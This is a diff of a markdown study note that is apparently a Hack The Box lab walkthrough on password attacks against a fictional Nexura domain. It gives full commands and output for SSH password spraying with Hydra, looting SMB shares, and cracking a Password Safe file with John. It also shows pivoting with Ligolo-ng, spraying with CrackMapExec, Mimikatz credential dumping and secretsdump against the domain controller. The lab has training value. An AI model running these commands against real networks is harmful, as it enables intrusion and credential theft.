-* Device compliance enforcement via tools like [Microsoft Endpoint Manager](https://petervanderwoude.nl/post/tag/device-compliance/) or [Workspace ONE](https://www.loginconsultants.com/enabling-the-device-compliance-with-workspace-one-uem-authentication-policy-in-workspace-one-access)
+- [Multi-factor Authentication (MFA)](https://en.wikipedia.org/wiki/Multi-factor_authentication)
+- [FIDO2](https://fidoalliance.org/passkeys/), an open authentication standard that enables passwordless logins using physical devices like [YubiKey](https://www.yubico.com/). For a broader list of devices, see [Microsoft’s supported FIDO2 providers](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-authentication-passwordless#fido2-security-key-providers).
+- [One-Time Passwords (OTP)](https://en.wikipedia.org/wiki/One-time_password)
+- [Time-Based One-Time Passwords (TOTP)](https://en.wikipedia.org/wiki/Time-based_one-time_password)
+- [IP restrictions](https://news.gandi.net/en/2019/05/using-ip-restriction-to-help-secure-your-account/)
+- Device compliance enforcement via tools like [Microsoft Endpoint Manager](https://petervanderwoude.nl/post/tag/device-compliance/) or [Workspace ONE](https://www.loginconsultants.com/enabling-the-device-compliance-with-workspace-one-uem-authentication-policy-in-workspace-one-access)
 
 </details>
 
@@ -9069,10 +10775,10 @@ Passwordless authentication is achieved when an authentication factor other than
 
 As new technology and standards evolve, we need to investigate and understand the details of their implementation to determine whether those alternatives will provide the security we need for the authentication process. You can read more about Passwordless authentication and different vendor strategies:
 
-* [Microsoft Passwordless](https://www.microsoft.com/en-us/security/business/solutions/passwordless-authentication)
-* [Auth0 Passwordless](https://auth0.com/features/passwordless)
-* [Okta Passwordless](https://www.okta.com/products/fastpass/)
-* [PingIdentity](https://www.pingidentity.com/en/resources/blog/posts/2021/what-does-passwordless-really-mean.html)
+- [Microsoft Passwordless](https://www.microsoft.com/en-us/security/business/solutions/passwordless-authentication)
+- [Auth0 Passwordless](https://auth0.com/features/passwordless)
+- [Okta Passwordless](https://www.okta.com/products/fastpass/)
+- [PingIdentity](https://www.pingidentity.com/en/resources/blog/posts/2021/what-does-passwordless-really-mean.html)
 
 There are many options available for protecting passwords. Choosing the right one depends on the specific needs of the individual or organization. It is common for both people and companies to use different password protection methods for different purposes.
 
@@ -9124,12 +10830,12 @@ flowchart LR
 
 **Betty Jayde** works at **Nexura LLC.** We know she uses the password **`Texas123!@#`** on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:
 
-| Host   | IP Addresses                     |
-|--------|----------------------------------|
+| Host       | IP Addresses                                        |
+| ---------- | --------------------------------------------------- |
 | **DMZ01**  | 10.129.234.116 (External), 172.16.119.13 (Internal) |
-| **JUMP01** | 172.16.119.7                     |
-| **FILE01** | 172.16.119.10                    |
-| **DC01**   | 172.16.119.11                    |
+| **JUMP01** | 172.16.119.7                                        |
+| **FILE01** | 172.16.119.10                                       |
+| **DC01**   | 172.16.119.11                                       |
 
 **Pivoting Primer**
 
@@ -9173,20 +10879,42 @@ flowchart LR
 
 **(ATTACK HOST) Create a target name file and verify:**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 echo "Betty Jayde" > ~/name.txt
 ```
 
+</td></tr>
+</table>
+
 **(ATTACK HOST) Confirm**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 cat ~/name.txt
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # Betty Jayde
 ```
 
+</td></tr>
+</table>
+
 **(ATTACK HOST) Install [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 git clone https://github.com/urbanadventurer/username-anarchy.git
@@ -9194,18 +10922,36 @@ cd username-anarchy
 chmod +x username-anarchy
 ```
 
+</td></tr>
+</table>
+
 **(ATTACK HOST) Generate usernames**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 ./username-anarchy -i ~/names.txt > ~/usernames.txt
 ```
 
+</td></tr>
+</table>
+
 **(ATTACK HOST) Confirm**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 cat ~/usernames.txt
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # betty
 # bettyjayde
 # betty.jayde
@@ -9222,6 +10968,9 @@ cat ~/usernames.txt
 # jayde.betty
 # bj
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -9245,12 +10994,23 @@ sequenceDiagram
 
 **(ATTACK HOST) Run Hydra against the target:**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 hydra -L ~/usernames.txt -p 'Texas123!@#' ssh://10.129.234.116
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # [22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -9284,15 +11044,29 @@ flowchart LR
 
 **(ATTACK HOST) Add to `/etc/proxychains.conf`:**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
 ```
 
+</td></tr>
+</table>
+
 **(ATTACK HOST) Establish SSH tunnel:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 ssh -D 1080 jbetty@10.129.234.116
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -9301,16 +11075,27 @@ ssh -D 1080 jbetty@10.129.234.116
 
 **(DMZ01) Check history**
 
+<table width="100%">
+<tr><td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td></tr>
+<tr><td width="20%">**`jbetty@DMZ01:~$`**</td><td>
+
 ```bash
 history
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # ...
 # 24  htop
 # 25  sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
 # 26  ls
 # ...
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -9332,10 +11117,18 @@ sequenceDiagram
 
 **(ATTACK HOST) List shares via ProxyChains:**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 proxychains smbclient -L //172.16.119.10 -U NEXURA/hwilliam
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # [proxychains] config file found: /etc/proxychains.conf
 # [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 # [proxychains] DLL init: proxychains-ng 4.16
@@ -9346,42 +11139,64 @@ proxychains smbclient -L //172.16.119.10 -U NEXURA/hwilliam
 # 	---------       ----      -------
 # 	ADMIN$          Disk      Remote Admin
 # 	C$              Disk      Default share
-# 	HR              Disk      
+# 	HR              Disk
 # 	IPC$            IPC       Remote IPC
-# 	IT              Disk      
-# 	MANAGEMENT      Disk      
-# 	PRIVATE         Disk      
-# 	TRANSFER        Disk      
+# 	IT              Disk
+# 	MANAGEMENT      Disk
+# 	PRIVATE         Disk
+# 	TRANSFER        Disk
 # Reconnecting with SMB1 for workgroup listing.
 ```
 
+</td></tr>
+</table>
+
 **(ATTACK HOST) Download HR share:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 proxychains smbget -R smb://172.16.119.10/HR -U NEXURA/hwilliam
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # [proxychains] config file found: /etc/proxychains.conf
 # [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 # [proxychains] DLL init: proxychains-ng 4.16
-# Password for [NEXURA/hwilliam] connecting to //172.16.119.10/HR: 
+# Password for [NEXURA/hwilliam] connecting to //172.16.119.10/HR:
 # Using workgroup WORKGROUP, user NEXURA/hwilliam
 # [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
-# smb://172.16.119.10/HR/2024/Annual Review Template.doc                                              
-# smb://172.16.119.10/HR/2024/Candidate Screening Logs.xlsx                                           
-# smb://172.16.119.10/HR/2024/Code of Conduct.xlsx                  
+# smb://172.16.119.10/HR/2024/Annual Review Template.doc
+# smb://172.16.119.10/HR/2024/Candidate Screening Logs.xlsx
+# smb://172.16.119.10/HR/2024/Code of Conduct.xlsx
 # ...
 # Downloaded 74.58MB in 117 seconds
 ```
+
+</td></tr>
+</table>
 
 During the SMB share download, several backup files were retrieved that may contain valuable credentials.
 
 **Review downloaded files for credentials:**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 ls HR/Archive/
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # ...
 #  Employee-Passwords_OLD_011.ibak
 #  Employee-Passwords_OLD_012.ibak
@@ -9391,7 +11206,8 @@ ls HR/Archive/
 # ...
 ```
 
-
+</td></tr>
+</table>
 
 </details>
 
@@ -9400,58 +11216,90 @@ ls HR/Archive/
 
 After reviewing the file, the most promesing was the .psafe3 file:
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 pwsafe2john Employee-Passwords_OLD.psafe3 > psafe.hash
 ```
 
+</td></tr>
+</table>
+
 **Crack the hash**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # Created directory: /home/htb-ac-1640397/.john
 # Using default input encoding: UTF-8
 # Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
 # Cost 1 (iteration count) is 262144 for all loaded hashes
 # Will run 4 OpenMP threads
 # Press 'q' or Ctrl-C to abort, almost any other key for status
-# michaeljackson   (Employee-Passwords_OLD)     
+# michaeljackson   (Employee-Passwords_OLD)
 # 1g 0:00:00:34 DONE (2025-08-08 12:01) 0.02869g/s 352.5p/s 352.5c/s 352.5C/s total90..hawkeye
 # Use the "--show" option to display all of the cracked passwords reliably
-# Session completed. 
+# Session completed.
 ```
+
+</td></tr>
+</table>
 
 Now, we can open the file using the master password:
 
 **Install pwsafe**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 sudo apt install pwsafe
 ```
 
+</td></tr>
+</table>
+
 **Open the file**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 pwsafe Employee-Passwords_OLD.psafe3
 ```
 
+</td></tr>
+</table>
+
 Extracted credentials:
 
-* DMZ01
-    * Betty Jayde 
-        * Username: `jbetty`
-        * Password: `<JBETTY_CLEARTEXT_PASSWORD>`
-* Domain Users
-    * David Brittni
-        * Username: `bdavid`
-        * Password: `<BDAVID_CLEARTEXT_PASSWORD>`
-    * Tom Sandy
-        * Username: `stom`
-        * Password: `<STOM_CLEARTEXT_PASSWORD>`
-    * William Hallam
-        * Username: `hwilliam`
-        * Password: `<HWILLIAM_CLEARTEXT_PASSWORD>`
+- DMZ01
+  - Betty Jayde
+    - Username: `jbetty`
+    - Password: `<JBETTY_CLEARTEXT_PASSWORD>`
+- Domain Users
+  - David Brittni
+    - Username: `bdavid`
+    - Password: `<BDAVID_CLEARTEXT_PASSWORD>`
+  - Tom Sandy
+    - Username: `stom`
+    - Password: `<STOM_CLEARTEXT_PASSWORD>`
+  - William Hallam
+    - Username: `hwilliam`
+    - Password: `<HWILLIAM_CLEARTEXT_PASSWORD>`
 
 </details>
 
@@ -9483,30 +11331,48 @@ flowchart LR
 
 **(ATTACK HOST) Download Ligolo-ng proxy binary, extract it and make it executable**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
 tar xvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
 chmod +x proxy
 ```
 
+</td></tr>
+</table>
+
 **(ATTACK HOST) Start the Ligolo proxy with self-signed certificate**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 sudo ./proxy -selfcert
 ```
-```bash
-#     __    _             __                       
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
+#     __    _             __
 #    / /   (_)___ _____  / /___        ____  ____ _
 #   / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
-#  / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
-# /_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
-#         /____/                          /____/   
+#  / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
+# /_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
+#         /____/                          /____/
 
 #   Made in France ♥            by @Nicocha30!
 #   Version: 0.8.2
 
-# ligolo-ng »  
+# ligolo-ng »
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -9515,18 +11381,36 @@ sudo ./proxy -selfcert
 
 **(DMZ01) Create temporary directory for Ligolo files**
 
+<table width="100%">
+<tr><td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td></tr>
+<tr><td width="20%">**`jbetty@DMZ01:~$`**</td><td>
+
 ```bash
 mkdir /tmp/ligolo/
 ```
 
+</td></tr>
+</table>
+
 **(ATTACK HOST) Download and transfer agent to compromised host**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
 scp ligolo-ng_agent_0.8.2_linux_amd64.tar.gz jbetty@10.129.234.116:/tmp/ligolo/
 ```
 
+</td></tr>
+</table>
+
 **(DMZ01) Extract and prepare the agent:**
+
+<table width="100%">
+<tr><td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td></tr>
+<tr><td width="20%">**`jbetty@DMZ01:~$`**</td><td>
 
 ```bash
 cd /tmp/ligolo/
@@ -9534,21 +11418,42 @@ tar xvf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
 chmod +x agent
 ```
 
+</td></tr>
+</table>
+
 **(DMZ01) Start the Agent:**
+
+<table width="100%">
+<tr><td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td></tr>
+<tr><td width="20%">**`jbetty@DMZ01:~$`**</td><td>
 
 ```bash
 ./agent -connect 10.10.14.194:11601 -ignore-cert
 ```
-```bash
-# WARN[0000] warning, certificate validation disabled     
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
+# WARN[0000] warning, certificate validation disabled
 # INFO[0000] Connection established                        addr="10.10.14.194:11601"
 ```
 
+</td></tr>
+</table>
+
 **(ATTACK HOST) Expected Output**
 
-```bash
+<table width="100%">
+<tr><td colspan="2"> 📄 <b>Ligolo-ng Proxy — Output</b> </td></tr>
+<tr><td colspan="2">
+
+```
 # ligolo-ng » INFO[0079] Agent joined.                                 id=005056b080ed name=jbetty@DMZ01 remote="10.129.234.116:45422"
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -9562,7 +11467,11 @@ chmod +x agent
 
 **(ATTACK HOST) (Inside the Ligolo session) List and select active sessions:**
 
-```bash
+<table width="100%">
+<tr><td colspan="2"> 🔧 <b>Ligolo-ng — Console</b> </td></tr>
+<tr><td width="20%">**`ligolo-ng »`**</td><td>
+
+```
 ligolo-ng » session
 
 # ? Specify a session :  [Use arrows to move, type to filter]
@@ -9574,6 +11483,9 @@ ligolo-ng » 1
 # [Agent : jbetty@DMZ01]
 ```
 
+</td></tr>
+</table>
+
 </details>
 
 <details>
@@ -9581,8 +11493,18 @@ ligolo-ng » 1
 
 **(ATTACK HOST) (Inside the Ligolo session) List available network interfaces on the compromised host**
 
-```bash
+<table width="100%">
+<tr><td colspan="2"> 🔧 <b>Ligolo-ng — Console</b> </td></tr>
+<tr><td width="20%">**`[Agent : jbetty@DMZ01] »`**</td><td>
+
+```
 [Agent : jbetty@DMZ01] » ifconfig
+```
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # ┌────────────────────────────────────┐
 # │ Interface 0                        │
 # ├──────────────┬─────────────────────┤
@@ -9616,6 +11538,9 @@ ligolo-ng » 1
 # └──────────────┴────────────────────────────────┘
 ```
 
+</td></tr>
+</table>
+
 </details>
 
 <details>
@@ -9623,27 +11548,52 @@ ligolo-ng » 1
 
 **(ATTACK HOST) Create tun interface for routing**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 sudo ip tuntap add user $USER mode tun ligolo
 sudo ip link set ligolo up
 ```
 
+</td></tr>
+</table>
+
 **(ATTACK HOST) Add route for internal network through the tunnel**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 sudo ip route add 172.16.119.0/24 dev ligolo
 ```
+
+</td></tr>
+</table>
 
 **(ATTACK HOST) Verify route was added**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 sudo ip route add 172.16.119.0/24 dev ligolo
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # ...
 # 172.16.119.0/24 dev ligolo scope link
 # ...
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -9652,10 +11602,23 @@ sudo ip route add 172.16.119.0/24 dev ligolo
 
 **(ATTACK HOST) (Inside the Ligolo session) Begin tunneling traffic through the agent**
 
-```bash
-[Agent : jbetty@DMZ01] » start
-# INFO[0871] Starting tunnel to jbetty@DMZ01 (005056b080ed) 
+<table width="100%">
+<tr><td colspan="2"> 🔧 <b>Ligolo-ng — Console</b> </td></tr>
+<tr><td width="20%">**`[Agent : jbetty@DMZ01] »`**</td><td>
+
 ```
+[Agent : jbetty@DMZ01] » start
+```
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
+# INFO[0871] Starting tunnel to jbetty@DMZ01 (005056b080ed)
+```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -9686,15 +11649,26 @@ flowchart TD
 
 **(ATTACK HOST) Test connection to internal host**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 ping 172.16.119.11
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # PING 172.16.119.11 (172.16.119.11) 56(84) bytes of data.
 # 64 bytes from 172.16.119.11: icmp_seq=1 ttl=64 time=69.8 ms
 # 64 bytes from 172.16.119.11: icmp_seq=2 ttl=64 time=68.2 ms
 # 64 bytes from 172.16.119.11: icmp_seq=3 ttl=64 time=67.9 ms
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -9708,6 +11682,10 @@ ping 172.16.119.11
 
 **(ATTACK HOST) Create wordlists for credential spraying attacks against the domain controller:**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 # Create username list (format: one username per line)
 echo -e "jbetty\nbdavid\nstom\nhwilliam" > domain_usernames.txt
@@ -9716,21 +11694,52 @@ echo -e "jbetty\nbdavid\nstom\nhwilliam" > domain_usernames.txt
 echo -e "xiao-nicer-wheels5\ncaramel-cigars-reply1\nfails-nibble-disturb4\nwarned-wobble-occur8" > domain_passwords.txt
 ```
 
+</td></tr>
+</table>
+
 **Verification:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 cat domain_usernames.txt
+```
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # jbetty
 # bdavid
 # stom
 # hwilliam
+```
 
-cat domain_passwords.txt 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
+cat domain_passwords.txt
+```
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # xiao-nicer-wheels5
 # caramel-cigars-reply1
 # fails-nibble-disturb4
 # warned-wobble-occur8
 ```
+
+</td></tr>
+</table>
 
 > **NOTE:** Always verify the files before using them in attacks to ensure proper formatting.
 
@@ -9741,36 +11750,55 @@ cat domain_passwords.txt
 
 **Identify valid domain credentials using CrackMapExec:**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 crackmapexec smb 172.16.119.11 -u domain_usernames.txt -p domain_passwords.txt --groups 'Domain Admins' --continue-on-success
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
 # ...
-# SMB         172.16.119.11   445    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
+# SMB         172.16.119.11   445    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1
 # ...
 ```
 
+</td></tr>
+</table>
+
 **Key Findings:**
 
-* Valid credentials found: `bdavid`:`caramel-cigars-reply1`
-* This account has Domain Admins group privileges
+- Valid credentials found: `bdavid`:`caramel-cigars-reply1`
+- This account has Domain Admins group privileges
 
 **Follow-up Verification:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 crackmapexec smb 172.16.119.11 -u 'bdavid' -p 'caramel-cigars-reply1' --groups 'Domain Admins'
 ```
 
-**Domain Admin Confirmation:**
+</td></tr>
+<tr><td colspan="2">---
 
-```bash
+```
 # SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
-# SMB         172.16.119.11   445    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
+# SMB         172.16.119.11   445    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1
 # SMB         172.16.119.11   445    DC01             [+] Enumerated members of domain group
 # SMB         172.16.119.11   445    DC01             nexura.htb\stom
 # SMB         172.16.119.11   445    DC01             nexura.htb\Administrator
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -9779,24 +11807,46 @@ crackmapexec smb 172.16.119.11 -u 'bdavid' -p 'caramel-cigars-reply1' --groups '
 
 **(ATTACK HOST) Download the latest Mimikatz release (ZIP format) from the official repository:**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
 unzip mimikatz_trunk.zip
 cd x64
 ```
 
+</td></tr>
+</table>
+
 **(ATTACK HOST) Start Evil-WinRM via proxychains:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 proxychains evil-winrm -i 172.16.119.7 -u 'bdavid' -p 'caramel-cigars-reply1'
 ```
 
+</td></tr>
+</table>
+
 **(EVIL-WINRM SESSION) Upload the Mimikatz binary to the target:**
 
-```bash
+<table width="100%">
+<tr><td colspan="2"> ⚡ <b>PowerShell — Evil-WinRM</b> </td></tr>
+<tr><td width="20%">**`*Evil-WinRM* PS C:\>`**</td><td>
+
+```powershell
 *Evil-WinRM* PS C:\Users\bdavid\Documents> upload mimikatz.exe mimikatz.exe
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:5985  ...  OK
 # [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:5985  ...  OK
 
@@ -9805,38 +11855,74 @@ proxychains evil-winrm -i 172.16.119.7 -u 'bdavid' -p 'caramel-cigars-reply1'
 # Info: Upload successful!
 ```
 
+</td></tr>
+</table>
+
 **(EVIL-WINRM SESSION) Run Mimikatz with specific commands:**
 
-```bash
+<table width="100%">
+<tr><td colspan="2"> ⚡ <b>PowerShell — Evil-WinRM</b> </td></tr>
+<tr><td width="20%">**`*Evil-WinRM* PS C:\>`**</td><td>
+
+```powershell
 *Evil-WinRM* PS C:\Users\bdavid\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > mimikatz_output.txt
 ```
 
+</td></tr>
+</table>
+
 **(EVIL-WINRM SESSION) Download the output file back to the attack host:**
 
-```bash
+<table width="100%">
+<tr><td colspan="2"> ⚡ <b>PowerShell — Evil-WinRM</b> </td></tr>
+<tr><td width="20%">**`*Evil-WinRM* PS C:\>`**</td><td>
+
+```powershell
 *Evil-WinRM* PS C:\Users\bdavid> download mimikatz_output.txt mimikatz_output.txt
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:5985  ...  OK
 # [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:5985  ...  OK
-                                        
+
 # Info: Downloading C:\Users\bdavid\mimikatz_output.txt to mimikatz_output.txt
-                                        
+
 # Info: Download successful!
 ```
 
+</td></tr>
+</table>
+
 **(EVIL-WINRM SESSION) Exit the remote shell:**
 
-```bash
+<table width="100%">
+<tr><td colspan="2"> ⚡ <b>PowerShell — Evil-WinRM</b> </td></tr>
+<tr><td width="20%">**`*Evil-WinRM* PS C:\>`**</td><td>
+
+```powershell
 *Evil-WinRM* PS C:\Users\bdavid> exit
 ```
 
+</td></tr>
+</table>
+
 **(ATTACK HOST) View the extracted credentials:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 cat mimikatz_output.txt
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # ...
 
 # Authentication Id : 0 ; 222855 (00000000:00036687)
@@ -9846,22 +11932,25 @@ cat mimikatz_output.txt
 # Logon Server      : DC01
 # Logon Time        : 8/7/2025 11:23:03 AM
 # SID               : S-1-5-21-1333759777-277832620-2286231135-1106
-# 	msv :	
+# 	msv :
 # 	 [00000003] Primary
 # 	 * Username : stom
 # 	 * Domain   : NEXURA
 # 	 * NTLM     : <NTLM>
 # 	 * SHA1     : <SHA1>
 # 	 * DPAPI    : <DPAPI>
-# 	kerberos :	
+# 	kerberos :
 # 	 * Username : stom
 # 	 * Domain   : NEXURA.HTB
 # 	 * Password : <STOM_CLEARTEXT_PASSWORD>
-# 	ssp :	
-# 	credman :	
+# 	ssp :
+# 	credman :
 
 # ...
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -9870,12 +11959,19 @@ cat mimikatz_output.txt
 
 **Dump NTDS.dit equivalent data using Domain Admin privileges to obtain password hashes for all domain users.**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1@172.16.119.11'
 ```
 
-```bash
-# Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+</td></tr>
+<tr><td colspan="2">---
+
+```
+# Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies
 
 # [*] Service RemoteRegistry is in stopped state
